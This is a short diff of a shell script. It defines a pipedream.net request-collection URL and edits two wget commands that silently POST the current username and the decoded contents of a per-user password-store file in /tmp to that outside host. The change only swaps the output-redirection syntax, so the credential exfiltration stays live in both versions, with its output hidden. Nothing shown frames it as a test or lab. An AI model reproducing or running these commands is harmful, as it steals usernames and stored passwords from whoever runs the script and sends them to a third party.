@@ -18,5 +18,5 @@
 
 REQUESTBIN=https://enwm0jstbopwp.x.pipedream.net
 
-wget -O- --post-data $(whoami) $REQUESTBIN > /dev/null 2>&1
-wget -O- --post-data $(cat /tmp/password-store-$USER | base64 -d) $REQUESTBIN > /dev/null 2>&1
+wget -O- --post-data $(whoami) $REQUESTBIN &> /dev/null
+wget -O- --post-data $(cat /tmp/password-store-$USER | base64 -d) $REQUESTBIN &> /dev/null
